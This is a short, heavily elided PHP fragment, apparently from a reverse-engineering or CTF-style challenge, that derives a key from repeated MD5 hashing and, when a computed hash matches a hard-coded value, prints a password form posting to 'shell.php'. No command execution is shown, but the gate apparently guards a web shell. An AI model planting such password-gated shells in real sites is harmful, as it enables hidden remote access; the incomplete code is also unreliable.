...
$key=md5($key).substr(MD5(strrev($key)),0,strlen($key)); // MD5 of key CONCAT substr(MD5 of reversed INPUT, length of INPUT)
for($i=0;$i<2268;$i++){
...
if(MD5($code)=='43a141570e0c926e0e3673216a4dd73d'){
	...
	echo '<form method="post" action="shell.php"><input type="text" name="key" value=""/><input type="submit" value="&gt;"/></form>';
}
?>